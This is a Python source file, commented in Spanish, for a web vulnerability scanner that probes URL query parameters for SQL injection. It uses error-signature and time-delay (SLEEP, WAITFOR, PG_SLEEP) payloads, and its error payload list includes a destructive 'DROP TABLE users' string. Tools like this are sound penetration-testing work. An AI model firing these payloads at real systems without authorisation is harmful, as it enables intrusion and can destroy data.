import re
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Any, Optional
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import requests

ERROR_PAYLOADS: list[str] = ["'", '"', "'))", "' OR '1'='1", "'))--", "1; DROP TABLE users--"]

# Firmas de error de base de datos precisas y estrictas para prevenir falsos positivos
ERROR_SIGNATURES: list[str] = [
    r"you have an error in your sql syntax",
    r"warning:\s*mysql_",
    r"unclosed quotation mark after the character string",
    r"quoted string not properly terminated",
    r"pg_query\(\):\s*query failed",
    r"sqlite3::query\(\)",
    r"sqlite_error",
    r"sqlite3\.operationalerror",
    r"syntax error.*near",
    r"microsoft OLE DB Provider for SQL Server",
    r"ODBC SQL Server Driver",
    r"ora-[0-9]{5}",
    r"oracle error",
    r"PostgreSQL query failed",
]

TIME_PAYLOADS: list[str] = [
    "1' AND (SELECT 1 FROM (SELECT(SLEEP(3)))x)--",
    "1' AND SLEEP(3)--",
    "1' OR SLEEP(3)--",
    "1'; WAITFOR DELAY '0:0:3'--",
    "1'; SELECT PG_SLEEP(3)--",
    "1) AND SLEEP(3)--",
]

def test_error_sqli(
    parsed: Any, params: dict[str, list[str]], param: str, payload: str, baseline_body: str = "", session: Optional[requests.Session] = None
) -> Optional[dict[str, str]]:
    test_params = params.copy()
    test_params[param] = [payload]
    new_query = urlencode(test_params, doseq=True)
    test_url = urlunparse(parsed._replace(query=new_query))
    try:
        client = session if session is not None else requests
        r = client.get(test_url, timeout=5)
        body = r.text

        # Ignorar errores genéricos de servidor (ej. 404 Not Found)
        if r.status_code == 404:
            return None

        matched_sigs = []
        for sig_pattern in ERROR_SIGNATURES:
            if re.search(sig_pattern, body, re.IGNORECASE) and not re.search(sig_pattern, baseline_body, re.IGNORECASE):
                matched_sigs.append(sig_pattern)

        if matched_sigs:
            return {
                "vuln": f"Posible SQLi en parámetro '{param}'",
                "risk": "Alto",
                "detail": f"Error de Base de Datos confirmado con payload: {payload} (coincidencia: {matched_sigs[0]})",
            }
    except requests.RequestException:
        pass
    return None

def test_time_sqli(
    parsed: Any,
    params: dict[str, list[str]],
    param: str,
    payload: str,
    baseline_time: float,
    base_url: str,
    session: Optional[requests.Session] = None,
) -> Optional[dict[str, str]]:
    test_params = params.copy()
    test_params[param] = [payload]
    new_query = urlencode(test_params, doseq=True)
    test_url = urlunparse(parsed._replace(query=new_query))
    try:
        client = session if session is not None else requests
        start_time = time.time()
        r = client.get(test_url, timeout=7)
        elapsed = time.time() - start_time

        # Validar el incremento significativo de tiempo (mínimo 2.7s por encima del baseline)
        if elapsed >= baseline_time + 2.7 and r.status_code < 500:
            # Doble verificación para evitar falsos positivos por picos de latencia de red
            try:
                start_verify = time.time()
                r_v = client.get(base_url, timeout=5)
                verify_elapsed = time.time() - start_verify

                if verify_elapsed < baseline_time + 1.2 and r_v.status_code == 200:
                    return {
                        "vuln": f"Posible Blind SQLi (Tiempo) en parámetro '{param}'",
                        "risk": "Alto",
                        "detail": f"El servidor tardó {elapsed:.2f}s en responder (Línea base: {baseline_time:.2f}s) con el payload: {payload}",
                    }
            except requests.RequestException:
                pass
    except requests.RequestException:
        pass
    return None

def check_sqli(url: str, session: Optional[requests.Session] = None) -> list[dict[str, str]]:
    results: list[dict[str, str]] = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    if not params:
        return results

    baseline_body = ""
    try:
        client = session if session is not None else requests
        start_base = time.time()
        r_base = client.get(url, timeout=5)
        baseline_time = time.time() - start_base
        baseline_body = r_base.text
    except requests.RequestException:
        baseline_time = 1.0

    tasks = []

    for param in params:
        for payload in ERROR_PAYLOADS:
            tasks.append(("error", param, payload))

    for param in params:
        for payload in TIME_PAYLOADS:
            tasks.append(("time", param, payload))

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {}
        for task_type, param, payload in tasks:
            if task_type == "error":
                fut = executor.submit(test_error_sqli, parsed, params, param, payload, baseline_body, session)
            else:
                fut = executor.submit(test_time_sqli, parsed, params, param, payload, baseline_time, url, session)
            futures[fut] = (param, task_type)

        flagged_params = set()
        for future in as_completed(futures):
            param, task_type = futures[future]
            if param in flagged_params:
                continue
            res = future.result()
            if res:
                results.append(res)
                flagged_params.add(param)

    return results
